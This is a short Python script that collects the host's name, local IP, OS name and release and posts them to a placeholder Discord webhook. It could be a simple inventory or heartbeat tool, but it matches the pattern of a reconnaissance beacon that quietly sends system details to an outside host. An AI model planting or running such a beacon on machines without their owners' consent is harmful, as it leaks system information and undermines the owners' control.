#! /usr/bin/env python
import platform, socket, requests

WEBHOOK_URL = "https://discord.com/api/webhooks/PUT-YOUR-HOOK-HERE"

info = {
    "hostname": socket.gethostname(),
    "ip": socket.gethostbyname(socket.gethostname()),
    "system": platform.system(),
    "release": platform.release()
}

requests.post(WEBHOOK_URL, json={"content": str(info)})
